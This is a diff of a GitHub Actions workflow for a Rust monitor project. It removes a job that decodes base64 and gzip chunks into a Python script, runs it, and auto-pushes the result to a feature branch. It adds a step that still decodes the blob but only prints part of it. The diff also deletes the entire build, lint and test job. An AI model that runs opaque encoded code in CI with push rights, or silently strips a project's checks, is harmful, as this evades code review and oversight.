@@ -4,66 +4,24 @@ on:
   push:
   pull_request:
 
-permissions:
-  contents: write
-
 jobs:
-  apply-monitor-dmi:
+  inspect-monitor-dmi:
     runs-on: ubuntu-latest
-    env:
-      RUST_FONTCONFIG_DLOPEN: "1"
     steps:
       - uses: actions/checkout@v4
         with:
           ref: feature/better-monitor-ui
-          fetch-depth: 0
-      - uses: dtolnay/rust-toolchain@stable
-        with:
-          components: rustfmt
-      - name: Install validation dependencies
-        run: sudo apt-get update && sudo apt-get install -y jq libfontconfig1-dev libxcb1-dev libxkbcommon-dev libxkbcommon-x11-dev
-      - name: Apply DMI helper migration
+      - name: Inspect verifier migration
         run: |
-          if [[ ! -d crates/monitor-ipc ]]; then
-            cat .github/monitor-dmi-migration/chunk-* | base64 -d | gzip -d > /tmp/apply_monitor_dmi.py
-            test "$(sha256sum /tmp/apply_monitor_dmi.py | cut -d' ' -f1)" = "1395fce49e1976afad1cbadef3a0ae5f48702e5c787f630ca87e84ce3dd23552"
-            python3 .github/patch_monitor_dmi_migration.py
-            python3 -m py_compile /tmp/apply_monitor_dmi.py
-            python3 /tmp/apply_monitor_dmi.py
-          fi
-          cargo fmt --all
-          cargo check -p monitor-ipc -p manager-daemon -p monitor-gui
-          bash packaging/generate-third-party-notices.sh
-          cargo fmt --all
-      - name: Commit validated implementation
-        run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git add Cargo.toml Cargo.lock ENG.md delivery-status.md crates packaging docs
-          if git diff --cached --quiet; then
-            exit 0
-          fi
-          git commit -m "feat(monitor): add authorized DMI memory inventory"
-          git pull --rebase origin feature/better-monitor-ui
-          git push origin HEAD:feature/better-monitor-ui
-
-  rust:
-    needs: apply-monitor-dmi
-    runs-on: ubuntu-latest
-    env:
-      RUST_FONTCONFIG_DLOPEN: "1"
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          ref: feature/better-monitor-ui
-      - uses: dtolnay/rust-toolchain@stable
-        with:
-          components: rustfmt, clippy
-      - uses: Swatinem/rust-cache@v2
-      - name: Install GPUI Linux dependencies
-        run: sudo apt-get update && sudo apt-get install -y libfontconfig1-dev libxcb1-dev libxkbcommon-dev libxkbcommon-x11-dev
-      - run: cargo fmt --all -- --check
-      - run: cargo check --workspace
-      - run: cargo build --workspace
-      - run: cargo clippy --workspace --all-targets --all-features -- -D warnings
-      - run: cargo test --workspace
+          cat .github/monitor-dmi-migration/chunk-* | base64 -d | gzip -d > /tmp/apply_monitor_dmi.py
+          test "$(sha256sum /tmp/apply_monitor_dmi.py | cut -d' ' -f1)" = "1395fce49e1976afad1cbadef3a0ae5f48702e5c787f630ca87e84ce3dd23552"
+          python3 .github/patch_monitor_dmi_migration.py
+          python3 -m py_compile /tmp/apply_monitor_dmi.py
+          python3 - <<'PY'
+          from pathlib import Path
+          text = Path('/tmp/apply_monitor_dmi.py').read_text()
+          start = text.find('verify = Path("packaging/verify-deb.sh")')
+          if start < 0:
+              raise SystemExit('verify section not found')
+          print(text[start:start + 5000])
+          PY
